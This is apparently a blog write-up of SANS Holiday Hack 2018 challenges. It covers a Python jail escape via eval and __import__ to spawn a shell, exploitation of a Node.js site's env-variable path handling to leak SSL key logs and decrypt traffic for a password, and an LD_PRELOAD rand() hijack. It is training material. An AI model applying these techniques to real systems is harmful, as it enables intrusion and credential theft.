                      ',,,,,,,,,.       .,,,,,,,,'                                  
                    .oooooooooo.        ',,,,,,,,.                                  
                   .NMMMMMMMMW;        cOOOOOOOOx                                   
                   0MMMMMMMMMc         NMMMMMMMMk                                   
                   ;;;;;;;;;'         .KKKKKKKKK:                                   
                  .,,,,,,,,,           ,,,,,,,,,.                                   
                  .ddddddddo           ',,,,,,,,.                                   
                   XMMMMMMMN           cKKKKKKKKK.                                  
        .;:::;;,,,,,:ldddddd.           0MMMMMMMMX.       ....                      
          .,:ccccccccccccccc            'cccccccccc:::ccccc;.                       
             .:ccccccccccccc            .ccccccccccccccc:'.                         
               .;;;;;;;;;;;;            .ccccccccccccc;.                            
                                        ..............                              
                                                                                    
                                                                                    
    I'm another elf in trouble,
    Caught within this Python bubble.
    Here I clench my merry elf fist -
    Words get filtered by a black list!
    Can't remember how I got stuck,
    Try it - maybe you'll have more luck?
    For this challenge, you are more fit.
    Beat this challenge - Mark and Bag it!
    -SugarPlum Mary
    To complete this challenge, escape Python
    and run ./i_escaped
    >>>

I first tried to :code:`import` the :code:`os` module, but it was forbidden:

.. code-block:: pycon

    >>> import os
    Use of the command import is prohibited for this question.

Other functions and objects like that are unavailable, such as
:code:`__builtins__`, or :code:`exec`. However, :code:`eval` is available:

.. code-block:: pycon

    >>> eval
    <built-in function eval>

Since :code:`eval` takes a string as an argument, and evaluates it as Python
code, I thought I could bypass the restriction on :code:`import`:

.. code-block:: pycon

    >>> eval('import os')
    Use of the command import is prohibited for this question.

Hmm, does not work. What if I try some string modification?

.. code-block:: pycon

    >>> eval('impor' + 't os')
    Traceback (most recent call last):
      File "<console>", line 1, in <module>
      File "<string>", line 1
        import os
             ^
    SyntaxError: invalid syntax

We get a syntax error. However, it does not seem like the jail tries to block
our :code:`import`. So, what are some other ways you can :code:`import` in
Python, without calling :code:`import`? By searching for write-ups of Python
jail escapes, I found this `website <https://codezen.fr/2012/10/25/hack-lu-ctf-python-jail-writeup/>`__
where the jail blocks :code:`__import__`. Let's see if our jail does also:

.. code-block:: pycon

    >>> eval('__impo' + 'rt__')                                                                    
    <built-in function __import__>

Alright! It's not blocked. We can use :code:`__import__` to import the
:code:`os` module, and the call :code:`system`, in order to gain a shell
access:

.. code-block:: console

    >>> eval('__imp'+'ort__("os").system("/bin/sh")')
    $ ls
    i_escaped
    $ ./i_escaped
    Loading, please wait......
     
      ____        _   _                      
     |  _ \ _   _| |_| |__   ___  _ __       
     | |_) | | | | __| '_ \ / _ \| '_ \      
     |  __/| |_| | |_| | | | (_) | | | |     
     |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
     | ____||___/___ __ _ _ __   ___  __| | |
     |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
     | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
     |_____|___/\___\__,_| .__/ \___|\__,_(_)
                         |_|                             
    That's some fancy Python hacking -
    You have sent that lizard packing!
    -SugarPlum Mary
                
    You escaped! Congratulations!

For those of you that are curious, here's the code of the jail, which includes
a solution:

.. code-block:: python
    :hl_lines: 31

    #! /usr/bin/env python3
    # -*- coding: utf-8 -*-
    import readline
    import code

    try:
        input = raw_input
    except:
        pass

    banner= ''' [snip] '''

    def readfilter(*args,**kwargs):
        inline = input(*args,**kwargs)
        #warning: if any of your imports enable the blacklisted items you will expose the question to the test taker.
        for eachterm in whitelist:
            if inline.replace(" ","") == eachterm.replace(" ",""):
                return inline
        #warning: removing any of the following items from this list will likely expose the question.
        for eachterm in restricted_terms:
            if eachterm.replace(" ","") in inline.replace(" ",""):
                print("Use of the command {0} is prohibited for this question.".format(eachterm))
                return ""
        return inline

    whitelist = []

    if __name__ == "__main__":
        restricted_terms = ['import','pty', 'open','exec',"compile", "os.system", "subprocess.", "reload", "__builtins__" ,"__class__","__mro__" ]
        code.interact(banner=banner, readfunc=readfilter, local=locals())
        #eval("__im"+"port__('p'+'ty').s"+"pawn('/bin/bash')")

Packet Capture and Analysis Website
-----------------------------------

Santa has created a `packet capture and analysis web site
<https://packalyzer.kringlecastle.com/>`__, where people can upload PCAP files
to analyze them, or sniff traffic from the website for 20 seconds:

.. image:: /images/sans-christmas-challenge-2018/packalyzer_sniffing_traffic.png
    :alt: packalyzer_sniffing_traffic.png
    :align: center

.. image:: /images/sans-christmas-challenge-2018/packalyzer_sniffing_done.png
    :alt: packalyzer_sniffing_done.png
    :align: center

Sniffing traffic from the website is interesting, because we could then see
other people's traffic. Unfortunately, the only traffic we see is HTTPS, which
means that it is encrypted. If we want to decrypt it, we have to find a way to
get the server's private SSL key.

Since the website offers an upload functionality, I tried uploading invalid
PCAP files, in order to get code execution via a webshell. However, it did not
work. I also tried some path traversing in the :code:`uploads` directory, but
it did not work:

.. code-block:: console

    $ curl 'https://packalyzer.kringlecastle.com/uploads/../../../../etc/passwd' -H 'Cookie: PASESSION=287850715490745264942409679417652'             
    Not Found

I tried some directory listing, but I also got an error there:

.. code-block:: console

    $ curl 'https://packalyzer.kringlecastle.com/uploads/' -H 'Cookie: PASESSION=287850715490745264942409679417652'  
    Error: EISDIR: illegal operation on a directory, read
    $ curl 'https://packalyzer.kringlecastle.com/uploads/test' -H 'Cookie: PASESSION=287850715490745264942409679417652' 
    Error: ENOENT: no such file or directory, open '/opt/http2/uploads//test

Ha! We got a different error message. The error codes :code:`EISDIR` and
:code:`ENOENT` indicates that the website is most likely based on Node.js. We
also learned that our web root is in :code:`/opt/http2/`. However, we're not
closer to our goal. So let's keep digging, by looking at the source code of the
website:

.. code-block:: html

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://packalyzer.kringlecastle.com:80/pub/js/jquery.ui.widget.js"></script>
    <script src="https://packalyzer.kringlecastle.com:80/pub/js/jquery.iframe-transport.js"></script>
    <script src="https://packalyzer.kringlecastle.com:80/pub/js/jquery.fileupload.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
    <script src="https://packalyzer.kringlecastle.com:80/pub/js/custom.js"></script>
    <script src="https://packalyzer.kringlecastle.com:80/pub/js/xss.js"></script>
    <script src="https://packalyzer.kringlecastle.com:80/pub/js/loader.js"></script>

That's kind of odd: the website loads some JavaScript files. What's odd is that
it connects to the packalyzer website using HTTPS, but on the TCP port 80,
which is usually used for plaintext HTTP. Let's investigate a little bit more
on this port. Let's try to see the content of the :code:`/pub/` directory:

.. code-block:: console
    :hl_lines: 6

    $ curl 'https://packalyzer.kringlecastle.com:80/pub/'                                                          
    <html>
    <head><title>403 Forbidden</title></head>
    <body bgcolor="white">
    <center><h1>403 Forbidden</h1></center>
    <hr><center>nginx/1.10.3</center>
    </body>
    </html>

Huh, we didn't get the same error message as before. Here, we can see that
we're communicating with an nginx server.

What is most likely happening here is that there are two webservers:

* One listening on TCP/443, which runs the Node.js application.
* One listening on TCP/80, which is most likely an nginx reverse proxy that
  serves static files to the web application.

That's interesting, maybe we can use the nginx reverse proxy to download the
server's SSL key. I tried several ideas, such as doing a path traversal to try
and download the SSL key, but it didn't work. So what other files can we try
to download. One of the most important files in a Node.js application is the
:code:`app.js` file, which holds most of the application logic. Let's try to
download it:

.. code-block:: console

    $ curl 'https://packalyzer.kringlecastle.com:80/app.js'                           
    #!/usr/bin/node
    //pcapalyzer - The web based packet analyzer
    const cluster = require('cluster');
    const os = require('os');
    const path = require('path');
    const fs = require('fs');
    const http2 = require('http2');
    const koa = require('koa');
    const Router = require('koa-router');
    const mime = require('mime-types');
    const mongoose = require('mongoose');
    const koaBody = require('koa-body');
    const cookie = require('koa-cookie');
    const execSync = require('child_process').execSync;
    const execAsync = require('child_process').exec;
    const redis = require("redis");
    const redis_connection = redis.createClient();
    const {promisify} = require('util');
    const getAsync = promisify(redis_connection.get).bind(redis_connection);
    const setAsync = promisify(redis_connection.set).bind(redis_connection);
    const delAsync = promisify(redis_connection.del).bind(redis_connection);
    const sha1 = require('sha1');
    [snip]

It works! Here's the full file. (There was some binary content in the middle
of the file that I removed):

.. code-block:: js
    :linenos:
    :hl_lines: 26 27 29 30 35 86 87 88 132 140

    #!/usr/bin/node
    //pcapalyzer - The web based packet analyzer
    const cluster = require('cluster');
    const os = require('os');
    const path = require('path');
    const fs = require('fs');
    const http2 = require('http2');
    const koa = require('koa');
    const Router = require('koa-router');
    const mime = require('mime-types');
    const mongoose = require('mongoose');
    const koaBody = require('koa-body');
    const cookie = require('koa-cookie');
    const execSync = require('child_process').execSync;
    const execAsync = require('child_process').exec;
    const redis = require("redis");
    const redis_connection = redis.createClient();
    const {promisify} = require('util');
    const getAsync = promisify(redis_connection.get).bind(redis_connection);
    const setAsync = promisify(redis_connection.set).bind(redis_connection);
    const delAsync = promisify(redis_connection.del).bind(redis_connection);
    const sha1 = require('sha1');
    require('events').EventEmitter.defaultMaxListeners = Infinity;
    const log = console.log;
    const print = log;
    const dev_mode = true;
    const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )
    const options = {
      key: fs.readFileSync(__dirname + '/keys/server.key'),
      cert: fs.readFileSync(__dirname + '/keys/server.crt'),
      http2: {
        protocol: 'h2',         // HTTP2 only. NOT HTTP1 or HTTP1.1
        protocols: [ 'h2' ],
      },
      keylog : key_log_path     //used for dev mode to view traffic. Stores a few minutes worth at a time
    };

    //==================================
    //Standard Mongoose Connection Stuff
    //==================================
    const app = new koa();
    const router = new Router();
    router.use(cookie.default());
    app.use(router.routes()).use(router.allowedMethods());
    mongoose.connect('mongodb://localhost:27017/packalyzer',{ useNewUrlParser: true });
    const Schema = mongoose.Schema;
    const userSchema = new Schema({
      name: { type: String, required: true, unique: true },
      email: { type: String, required: true, unique: true },
      password: { type: String, required: true },
      is_admin: { type: Boolean, required: true },
      captures: { type: Array, required: true },
    });
    const Users = mongoose.model('Users', userSchema);
    //Sets Users to be allowed to sniff or just admins
    const Allow_All_To_Sniff = true;

    //==================================
    //Standard Mongoose Connection Stuff
    //==================================

    Array.prototype.clean = function(deleteValue) {
      for (var i = 0; i < this.length; i++) {
          if (this[i] == deleteValue) {         
          this.splice(i, 1);
          i--;
          }
      }
      return this;
    };
    var uniqueArray = function(arrArg) {
      return arrArg.filter(function(elem, pos,arr) {
        return arr.indexOf(elem) == pos;
      });
    };
    function load_envs() {
      var dirs = []
      var env_keys = Object.keys(process.env)
      for (var i=0; i < env_keys.length; i++) {
        if (typeof process.env[env_keys[i]] === "string" ) {
          dirs.push(( "/"+env_keys[i].toLowerCase()+'/*') )
        }
      }
      return uniqueArray(dirs)
    }
    if (dev_mode) {
        //Can set env variable to open up directories during dev
        const env_dirs = load_envs();
    } else {
        const env_dirs = ['/pub/','/uploads/'];
    }

    const api_functions = {
        'login':login,
        'logout':logout,
        'users':find_users,
        'register':register,
        'upload':upload,
        'list':list_caps,
        'delete':delete_caps,
        'sniff':sniff_traffic,
        'process':start_process,
      }
      const api_function = async (ctx, next) => {
        var Session = await sessionizer(ctx);
        const action = ctx.params.action;
        if ((Session.authenticated && Object.keys(api_functions).includes(action)) || ['login','register','users'].includes(action) ) {
          if (typeof api_functions[action] === 'function') {
            try{
              await api_functions[action](ctx, next, Session);
            } catch (e) {
              log(e)
              ctx.status=500;
              ctx.body=e.toString();
            }
          } else {
            ctx.body='Not Found';
          }
        } else {
          ctx.status=401;
          ctx.body='Unauthorized';
        }
        await next();
      }
      //Route for anything in the public folder except index, home and register
    router.get(env_dirs,  async (ctx, next) => {
    try {
        var Session = await sessionizer(ctx);
        //Splits into an array delimited by /
        let split_path = ctx.path.split('/').clean("");
        //Grabs directory which should be first element in array
        let dir = split_path[0].toUpperCase();
        split_path.shift();
        let filename = "/"+split_path.join('/');
        while (filename.indexOf('..') > -1) {
        filename = filename.replace(/\.\./g,'');
        }
        if (!['index.html','home.html','register.html'].includes(filename)) {
        ctx.set('Content-Type',mime.lookup(__dirname+(process.env[dir] || '/pub/')+filename))
        ctx.body = fs.readFileSync(__dirname+(process.env[dir] || '/pub/')+filename)
        } else {
        ctx.status=404;
        ctx.body='Not Found';
        }
    } catch (e) {
        ctx.body=e.toString();
    }
    });

    router
    .get('/api/:action', async (ctx, next) => {
    await api_function(ctx, next)
    })
    .post('/api/:action', koaBody({ multipart: true }), async (ctx, next) => {
    await api_function(ctx, next)
    })

    const server = http2.createSecureServer(options, app.callback());
    server.listen(443);

What can we learn from this source code:

* Line 26: the application is running in dev mode
* Line 27: the :code:`key_log_path` variable holds the path to the SSL secrets
  used by the server
* Line 27: the :code:`process.env` contains the path to the SSL secrets file
* Lines 86-88: in dev mode, every directory that is in the :code:`process.env`
  variable is potentially accessible via the webserver.
* Lines 132, 140: if we access https://packalyzer.kringlecastle.com/secret_directory/secret_file,
  the webserver will use the value of :code:`process.env.secret_directory` as
  the name of our folder to get the :code:`secret_file`.

This last point is interesting. Since :code:`process.env` contains the path to
the SSL secrets, we can try to use this automatic resolution to get the content
of :code:`key_log_path`. First let's try to resolve the
:code:`process.env.SSLKEYLOGFILE` variable:

.. code-block:: console

    $ curl 'https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/'
    Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/

So, the value of this variable seems to be
:code:`packalyzer_clientrandom_ssl.log`. We can now access the file. We use the
same trick as before to resolve the :code:`process.env.DEV` variable:

.. code-block:: console

    $ curl 'https://packalyzer.kringlecastle.com/DEV/packalyzer_clientrandom_ssl.log'
    CLIENT_RANDOM D5DFF2B39A827877C64457B9F246A2BC05869EDA679F2167692ACB36480AABB4 B6B4C39A3161566566E6291030EDEBA1F91511B8513F07CBE4A159022F497A1AEB18821887B51FDC1764F2219DEFC001
    CLIENT_RANDOM BBEE641A4FB1B77D8D23FE324649B02E30B024BEA322D61CC77F2A1A5A6423C7 6289BBAFD1DF5C23CCC68C6E579D71E1D18416F2D0CEB05351E10A7C27A22FEDC66221C33DFCC908490C0EBBF9BF8F97
    CLIENT_RANDOM 1C7E42420FBC79D157D86366DB1907CEC1D27343893647AF60D72CD4913825FE AEBC249465A01BA3A8D30E1FEB665CA0128A4F1BAC14D809F1B1F6F38F7B2423FFBC45E1402CA65E8B746174716F9B89
    CLIENT_RANDOM 0E21203AE0707D515D46EF381CB7E04729110B18BF8DBE8EE8C6AA2D7F1A3742 C3461766C26A9209F1F248C4C7FA9A5E588A9E7933697D7F586D3380B187A344B04EB41C9232207008E54D9E4EAF53F8
    CLIENT_RANDOM 2E6C446BACF3F740DA5DFB31BC922138C49B13C6DD522C770F81339D0582085A 90E48FE08378BB0E6569CB27547E8AAF724726289AE86188483A8C4D7B76A52DCA0598BBD8FF78E5F70CFDEA02208859
    [snip]

Awesome, we get the SSL secrets of the webserver. We can use this to decrypt
our sniffed traffic. Here's what we'll do:

* We'll sniff 20 seconds of traffic.
* We'll quickly download the SSl secrets file, because it will most likely
  contain the secrets for our sniffed traffic.

`Here </docs/sans-christmas-challenge-2018/31002530_14-1-2019_9-57-43.pcap>`__'s
my capture file, and `here </docs/sans-christmas-challenge-2018/packalyzer_clientrandom_ssl.log>`__'s
my SSL secrets file. Now, let's open up Wireshark, so that we can decrypt the
traffic. I found `these slides <https://lekensteyn.nl/files/wireshark-ssl-decryption.pdf#page=11>`__
that explain how you can configure Wireshark to use our SSL secrets:

.. image:: /images/sans-christmas-challenge-2018/packalyzer_wireshark_http2_decrypted.png
    :alt: packalyzer_wireshark_http2_decrypted.png
    :align: center

Awesome, we now have decrypted the HTTP/2 traffic to the website. If we look
around, we see a login request:

.. image:: /images/sans-christmas-challenge-2018/packalyzer_wireshark_password.png
    :alt: packalyzer_wireshark_password.png
    :align: center

We found Alabaster's password to the packalyzer,
:code:`alabaster:Packer-p@re-turntable192`. Let's connect to the web site with
these credentials, and see what capture files he has accessible:

.. image:: /images/sans-christmas-challenge-2018/packalyzer_alabaster_login.png
    :alt: packalyzer_alabaster_login.png
    :align: center

Hmmm, :code:`super_secret_packet_capture.pcap`, sounds interesting! You can
download it `here </docs/sans-christmas-challenge-2018/super_secret_packet_capture.pcap>`__.
Let's open it in Wireshark:

.. image:: /images/sans-christmas-challenge-2018/packalyzer_wireshark_smtp.png
    :alt: packalyzer_wireshark_smtp.png
    :align: center

We can see some SMTP traffic. Let's follow the TCP stream to get a clearer
picture:

.. code-block:: text
    :hl_lines: 31

    220 mail.kringlecastle.com ESMTP Postfix (Ubuntu)
    EHLO Mail.kringlecastle.com
    250-mail.kringlecastle.com
    250-PIPELINING
    250-SIZE 10240000
    250-VRFY
    250-ETRN
    250-STARTTLS
    250-ENHANCEDSTATUSCODES
    250-8BITMIME
    250 DSN

    MAIL FROM:<Holly.evergreen@mail.kringlecastle.com>
    250 2.1.0 Ok
    RCPT TO:<alabaster.snowball@mail.kringlecastle.com>
    250 2.1.5 Ok
    DATA
    354 End data with <CR><LF>.<CR><LF>
    Date: Fri, 28 Sep 2018 11:33:17 -0400
    To: alabaster.snowball@mail.kringlecastle.com
    From: Holly.evergreen@mail.kringlecastle.com
    Subject: test Fri, 28 Sep 2018 11:33:17 -0400
    MIME-Version: 1.0
    Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_11181"

    ------=_MIME_BOUNDARY_000_11181
    Content-Type: text/plain

    Hey alabaster, 

    Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.

    ------=_MIME_BOUNDARY_000_11181
    Content-Type: application/octet-stream
    Content-Transfer-Encoding: BASE64
    Content-Disposition: attachment

    JVBERi0xLjUKJb/3ov4KOCAwIG9iago8PCAvTGluZWFyaXplZCAxIC9MIDk3ODMxIC9IIFsgNzM4
    IDE0MCBdIC9PIDEyIC9FIDc3MzQ0IC9OIDIgL1QgOTc1MTcgPj4KZW5kb2JqCiAgICAgICAgICAg
    ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
    ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKOSAwIG9iago8PCAv
    [snip]
    2zMAAFMTA30KZW5kc3RyZWFtCmVuZG9iagogICAgICAgICAgICAgICAgICAgICAgICAgICAgIApz
    dGFydHhyZWYKMjE2CiUlRU9GCg==

    ------=_MIME_BOUNDARY_000_11181--


    .

    250 2.0.0 Ok: queued as 4CF931B5C3C0
    QUIT
    221 2.0.0 Bye

We get a mail from Molly Evergreen with an attached document that explains
`music transposition <https://en.wikipedia.org/wiki/Transposition_(music)>`__.
Let's copy/paste the base64 encoded document and decode it:

.. code-block:: console

    $ base64 -d < attachment.b64 > attachment
    $ file attachment
    attachment: PDF document, version 1.5
    $ mv attachment music_transposition.pdf

We get a `PDF file </docs/sans-christmas-challenge-2018/music_transposition.pdf>`__.
Here's what it says:

    A piano keyboard gives us easy access to every (western) tone. As we go
    from left to right, the pitches get higher. Pressing the middle A, for
    example, would give us a tone of 440 Hertz. Pressing the next A up (to the
    right) gives us 880 Hz, while the next one down (left) produces 220 Hz.
    These A tones each sound very similar to us - just higher and lower. Each A
    is an "octave" apart from the next. Going key by key, we count 12 "half
    tone" steps between one A and the next - 12 steps in an octave.

    As you may have guessed, elf (and human) ears perceive pitches
    logarithmically. That is, the frequency jump between octaves doubles as we
    go up the keyboard, and that sounds normal to us. Consequently, the precise
    frequency of each note other than A can only be cleanly expressed with a
    log base 12 expression. Ugh! For our purposes though, we can think of note
    separation in terms of whole and half steps.

    Have you noticed the black keys on the keyboard? They represent half steps
    between the white keys. For example, the black key between C and D is
    called C# (c-sharp) or Db (d-flat). Going from C to D is a whole step, but
    either is a half step from C#/Db. Some white keys don’t have black ones
    between them. B & C and E & F are each only a half step apart. Why? Well,
    it turns out that our ears like it that way. Try this: press C D E F G A B
    C on a piano. It sounds natural, right? The "C major" scale you just played
    matches every other major scale:

    *  whole step from C to D
    *  whole step from D to E
    *  half step from E to F
    *  whole step from F to G
    *  Whole step from G to A
    *  Whole step from A to B, and finally
    *  Half step from B to C

    If you follow that same pattern (whole whole half whole whole whole half),
    you can start from any note on the keyboard and play a major scale. So a Bb
    major scale would be Bb C D Eb F G A Bb. You can get this by counting whole
    and half steps up from Bb or by taking each note in the C major scale and
    going down a whole step.

    This uniform shifting of tones is called transposition. This is done all
    the time in music because of differences in how instruments are designed,
    the sound an arranger wants to achieve, or the comfortable vocal range of a
    singer. Some elves can do this on the fly without really thinking, but it
    can always be done manually, looking at a piano keyboard.

    To look at it another way, consider a song "written in the key of Bb." If
    the musicians don’t like that key, it can be transposed to A with a little
    thought. First, how far apart are Bb and A? Looking at our piano, we see
    they are a half step apart. OK, so for each note, we’ll move down one half
    step. Here’s an original in Bb:

    D C Bb C D D D C C C D F F D C Bb C D D D D C C D C Bb

    And take everything down one half step for A:

    C# B A B C# C# C# B B B C# E E C# B A B C# C# C# C# B B C# B A

    We’ve just taken Mary Had a Little Lamb from Bb to A!

So, the song in the document is "Mary Had a Little Lamb"!

Ransomware Recovery
~~~~~~~~~~~~~~~~~~~

Shiny Upatree's Cranberry Pi Challenge
--------------------------------------

We must win Shiny Upatree's lottery.

.. code-block:: console

    I'll hear the bells on Christmas Day
    Their sweet, familiar sound will play
      But just one elf,
      Pulls off the shelf,
    The bells to hang on Santa's sleigh!
    Please call me Shinny Upatree
    I write you now, 'cause I would be
      The one who gets -
      Whom Santa lets
    The bells to hang on Santa's sleigh!
    But all us elves do want the job,
    Conveying bells through wint'ry mob
      To be the one
      Toy making's done
    The bells to hang on Santa's sleigh!
    To make it fair, the Man devised
    A fair and simple compromise.
      A random chance,
      The winner dance!
    The bells to hang on Santa's sleigh!
    Now here I need your hacker skill.
    To be the one would be a thrill!
      Please do your best,
      And rig this test
    The bells to hang on Santa's sleigh!
    Complete this challenge by winning the sleighbell lottery for Shinny Upatree.
    elf@04895b80b092:~$

So, let's see this lottery:

.. code-block:: console

    elf@04895b80b092:~$ ls
    gdb  objdump  sleighbell-lotto
    elf@04895b80b092:~$ ./sleighbell-lotto 
    The winning ticket is number 1225.
    Rolling the tumblers to see what number you'll draw...
    You drew ticket number 4526!
    Sorry - better luck next year!

Hmm, let's try again:

.. code-block:: console

    elf@04895b80b092:~$ ./sleighbell-lotto 
    The winning ticket is number 1225.
    Rolling the tumblers to see what number you'll draw...
    You drew ticket number 9478!
    Sorry - better luck next year!

So, we draw a random number, and we're supposed to get 1225.

Yannick's (dirty) solution
..........................

If you remember, we had a similar challenge in `last year's Holiday Hack
</posts/2018/01/10/sans-christmas-challenge-2017/#id14>`__. We can create a
fake C library and then use the `LD_PRELOAD <https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win>`__
trick to change the behaviour of the :code:`rand` function. Let's check that
the :code:`sleighbell-lotto` uses :code:`rand`:

.. code-block:: console
    :hl_lines: 4 5

    elf@04895b80b092:~$ ./objdump -d ./sleighbell-lotto  | grep -i rand
    00000000000009a0 <srand@plt>:
     9a0:   ff 25 0a 76 20 00       jmpq   *0x20760a(%rip)        # 207fb0 <srand@GLIBC_2.2.5>
    00000000000009c0 <rand@plt>:
     9c0:   ff 25 fa 75 20 00       jmpq   *0x2075fa(%rip)        # 207fc0 <rand@GLIBC_2.2.5>
        1505:       e8 96 f4 ff ff          callq  9a0 <srand@plt>
        1520:       e8 9b f4 ff ff          callq  9c0 <rand@plt>

Alright, it seems to do so. Let's create our fake library. Trouble is, there's
no :code:`gcc` on the elf terminal. So let's generate this library on our own
computer, and then copy it to the elf terminal:

.. code-block:: console

    $ cat hijack_rand.c 
    int rand()
    {
        return 1225;
    }
    $ gcc -o hijack_rand.so -shared -fPIC ./hijack_rand.c
    $ base64 ./hijack_rand.so 
    f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoAQAAAAAAABAAAAAAAAAABAXAAAAAAAAAAAAAEAAOAAH
    AEAAGAAXAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAYAAAAAAAA0BgAAAAAAAAAA
    IAAAAAAAAQAAAAYAAACADgAAAAAAAIAOIAAAAAAAgA4gAAAAAACgAQAAAAAAAKgBAAAAAAAAAAAg
    AAAAAAACAAAABgAAAJAOAAAAAAAAkA4gAAAAAACQDiAAAAAAAFABAAAAAAAAUAEAAAAAAAAIAAAA
    AAAAAAQAAAAEAAAAyAEAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAA
    [snip]

Now, let's copy the base64 in the elf terminal:

.. code-block:: console

    elf@04895b80b092:~$ echo "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoAQAAAAAAABAAAAAAAAAABAXAAAAAAAAAAAAAEAAOAAH
    > AEAAGAAXAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAYAAAAAAAA0BgAAAAAAAAAA
    > IAAAAAAAAQAAAAYAAACADgAAAAAAAIAOIAAAAAAAgA4gAAAAAACgAQAAAAAAAKgBAAAAAAAAAAAg
    > AAAAAAACAAAABgAAAJAOAAAAAAAAkA4gAAAAAACQDiAAAAAAAFABAAAAAAAAUAEAAAAAAAAIAAAA
    > [snip]
    > CAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAANAUAAAAAAAAfAEAAAAAAAAA
    > AAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABMFgAAAAAAAMMA
    > AAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA" > ./hijack_rand.so.b64
    elf@bb438504d48c:~$ base64 -d < ./hijack_rand.so.b64 > ./hijack_rand.so     
    elf@bb438504d48c:~$ LD_PRELOAD="./hijack_rand.so" ./sleighbell-lotto 
    The winning ticket is number 1225.
    Rolling the tumblers to see what number you'll draw...
    You drew ticket number 1225!
                                                                                    
                                                         .....          ......      
                                         ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                                 .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                             ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                         .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                      .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                    'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
                  ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
                .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
               .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
               xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
              :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
           ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
         ...................,',,:lxkkkkkkkkkkkkkd.                                  
         ..........................';;:coxkkkkk:                                    
            ...............................ckd.                                     
              ...............................                                       
                    ...........................                                     
                       .......................                                      
                                  ....... ...                                       
    With gdb you fixed the race.
    The other elves we did out-pace.
      And now they'll see.
      They'll all watch me.
    I'll hang the bells on Santa's sleigh!
    Congratulations! You've won, and have successfully completed this challenge.

The "official" solution
.......................

As we can see from the congratulation message, and the fact that :code:`gdb` is
present on the elf shell, the official way to solve this challenge is to use
:code:`gdb`. So, let's load the lottery program in :code:`gdb`:

.. code-block:: console
    :hl_lines: 51

    elf@2ba77dc8fde8:~$ ./gdb -q ./sleighbell-lotto 
    Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.
    (gdb) disas main
    Dump of assembler code for function main:
       0x00000000000014ca <+0>:     push   %rbp
       0x00000000000014cb <+1>:     mov    %rsp,%rbp
       0x00000000000014ce <+4>:     sub    $0x10,%rsp
       0x00000000000014d2 <+8>:     lea    0x56d6(%rip),%rdi        # 0x6baf
       0x00000000000014d9 <+15>:    callq  0x970 <getenv@plt>
       0x00000000000014de <+20>:    test   %rax,%rax
       0x00000000000014e1 <+23>:    jne    0x14f9 <main+47>
       0x00000000000014e3 <+25>:    lea    0x56d6(%rip),%rdi        # 0x6bc0
       0x00000000000014ea <+32>:    callq  0x910 <puts@plt>
       0x00000000000014ef <+37>:    mov    $0xffffffff,%edi
       0x00000000000014f4 <+42>:    callq  0x920 <exit@plt>
       0x00000000000014f9 <+47>:    mov    $0x0,%edi
       0x00000000000014fe <+52>:    callq  0x9e0 <time@plt>
       0x0000000000001503 <+57>:    mov    %eax,%edi
       0x0000000000001505 <+59>:    callq  0x9a0 <srand@plt>
       0x000000000000150a <+64>:    lea    0x583f(%rip),%rdi        # 0x6d50
       0x0000000000001511 <+71>:    callq  0x910 <puts@plt>
       0x0000000000001516 <+76>:    mov    $0x1,%edi
       0x000000000000151b <+81>:    callq  0x960 <sleep@plt>
       0x0000000000001520 <+86>:    callq  0x9c0 <rand@plt>
       0x0000000000001525 <+91>:    mov    %eax,%ecx
       0x0000000000001527 <+93>:    mov    $0x68db8bad,%edx
       0x000000000000152c <+98>:    mov    %ecx,%eax
       0x0000000000001516 <+76>:    mov    $0x1,%edi
       0x000000000000152e <+100>:   imul   %edx
       0x0000000000001530 <+102>:   sar    $0xc,%edx
       0x0000000000001533 <+105>:   mov    %ecx,%eax
       0x0000000000001535 <+107>:   sar    $0x1f,%eax
       0x0000000000001538 <+110>:   sub    %eax,%edx
       0x000000000000153a <+112>:   mov    %edx,%eax
       0x000000000000153c <+114>:   mov    %eax,-0x4(%rbp)
       0x000000000000153f <+117>:   mov    -0x4(%rbp),%eax
